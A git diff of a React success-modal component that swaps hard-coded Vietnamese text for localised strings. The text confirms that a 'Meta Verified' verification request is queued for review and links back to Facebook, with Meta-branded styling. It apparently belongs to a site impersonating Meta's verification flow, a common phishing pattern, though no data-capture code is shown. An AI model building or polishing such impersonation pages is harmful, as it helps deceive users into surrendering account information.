@@ -1,4 +1,9 @@
+'use client'
+
 import React from 'react';
+
+import { useAppStrings } from '@/hooks/useAppStrings';
+
 import Modal from './Modal';
 
 interface SuccessModalProps {
@@ -7,7 +12,7 @@ interface SuccessModalProps {
 }
 
 const SuccessModal: React.FC<SuccessModalProps> = ({ isOpend, onToggleSuccess }) => {
-
+    const t = useAppStrings();
     const [isOpen, setIsOpen] = React.useState(isOpend);
 
     React.useEffect(() => {
@@ -22,7 +27,7 @@ const SuccessModal: React.FC<SuccessModalProps> = ({ isOpend, onToggleSuccess })
     return (
         <Modal
             isOpen={isOpen}
-            title="Hồ sơ đã được tiếp nhận"
+            title={t.success.title}
             onClose={handleClose}
         >
 
@@ -32,16 +37,16 @@ const SuccessModal: React.FC<SuccessModalProps> = ({ isOpend, onToggleSuccess })
                         <img src="/images/meta/succes.jpg" width="100%" alt="success" />
                     </div>
                     <p className='text-[#4f5f79] mb-[10px] text-[15px] leading-[1.65] pt-4'>
-                        Yêu cầu xác minh Meta Verified của bạn đã được thêm vào hàng đợi xử lý ưu tiên. Đội ngũ kiểm duyệt sẽ đối chiếu thông tin và cập nhật kết quả trong thời gian sớm nhất.
+                        {t.success.p1}
                     </p>
                     <p className='text-[#6b7b95] mb-[20px] text-[14px] leading-[1.6]'>
-                        Trường hợp cần bổ sung dữ liệu, hệ thống sẽ gửi hướng dẫn để bạn hoàn tất hồ sơ.
+                        {t.success.p2}
                     </p>
                     <a
-                        className='h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-opacity duration-300 hover:opacity-90'
+                        className='min-h-[48px] w-full bg-[#0064E0] text-white rounded-[40px] px-4 py-[10px] flex items-center justify-center transition-opacity duration-300 hover:opacity-90 active:opacity-90'
                         href="https://www.facebook.com"
                     >
-                        Quay lại Facebook
+                        {t.success.cta}
                     </a>
                 </div>
 
